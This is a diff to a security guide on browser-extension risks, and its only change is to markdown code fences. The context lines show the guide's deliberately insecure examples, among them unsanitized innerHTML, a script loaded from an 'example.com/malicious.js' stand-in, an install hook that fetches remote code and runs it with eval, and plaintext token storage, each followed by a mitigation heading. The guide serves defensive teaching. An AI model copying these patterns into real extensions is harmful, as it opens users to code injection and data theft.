@@ -33,7 +33,7 @@ Browser extensions sometimes request more permissions than they actually need. T
     "storage"
   ]
 }
-```text
+```
 
 ### Mitigation: Permissions Overreach
 
@@ -56,7 +56,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     });
   }
 });
-```text
+```
 
 ### Mitigation: Data Leakage
 
@@ -73,7 +73,7 @@ If user input is not properly sanitized, attackers can inject malicious scripts 
 ```javascript
 let userInput = document.getElementById('input').value;
 document.getElementById('output').innerHTML = userInput; // No sanitization
-```text
+```
 
 ### Mitigation: Cross-Site Scripting (XSS)
 
@@ -89,7 +89,7 @@ Some extensions send sensitive data over unsecured HTTP connections, making it v
 
 ```javascript
 fetch('http://example.com/api/data');
-```text
+```
 
 ### Mitigation: Insecure Communication
 
@@ -107,7 +107,7 @@ An extension that dynamically loads scripts from an untrusted source can be expl
 let script = document.createElement('script');
 script.src = 'http://example.com/malicious.js';
 document.body.appendChild(script);
-```text
+```
 
 ### Mitigation: Code Injection
 
@@ -127,7 +127,7 @@ chrome.runtime.onInstalled.addListener(() => {
     .then(response => response.text())
     .then(eval); // Unsafe!
 });
-```text
+```
 
 ### Mitigation: Malicious Updates
 
@@ -149,7 +149,7 @@ Using outdated or vulnerable third-party libraries in an extension can introduce
     "vulnerable-lib": "1.0.0"
   }
 }
-```text
+```
 
 ### Mitigation: Third-Party Dependencies
 
@@ -169,7 +169,7 @@ Without a strict CSP, attackers can inject scripts into an extension’s web pag
   "name": "My Extension",
   "content_security_policy": "default-src 'self'"
 }
-```text
+```
 
 ### Mitigation: Lack of Content Security Policy (CSP)
 
@@ -185,7 +185,7 @@ Storing sensitive data like authentication tokens in localStorage or other unsec
 
 ```javascript
 localStorage.setItem('token', 'my-secret-token'); // No encryption
-```text
+```
 
 ### Mitigation: Insecure Storage
 
@@ -207,7 +207,7 @@ If an extension does not clearly define how it collects and handles user data, i
   "name": "My Extension",
   "description": "A cool extension with no privacy policy."
 }
-```text
+```
 
 ### Mitigation: Insufficient Privacy Controls
 
@@ -238,7 +238,7 @@ const userData = {
 const userInfoDiv = document.createElement('div');
 userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
 document.body.appendChild(userInfoDiv);
-```text
+```
 
 ### Mitigation: DOM-based Data Skimming
 
@@ -289,7 +289,7 @@ window.addEventListener('message', (data) => {
     window.apiController.apiKey = data.apiKey;
   }
 })
-```text
+```
 
 ### Mitigation: Prototype-based Data Skimming
 
@@ -315,7 +315,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     fetch(SECRET_API_URL);
   }
 });
-```text
+```
 
 ### Mitigation: Insecure Message Passing
 
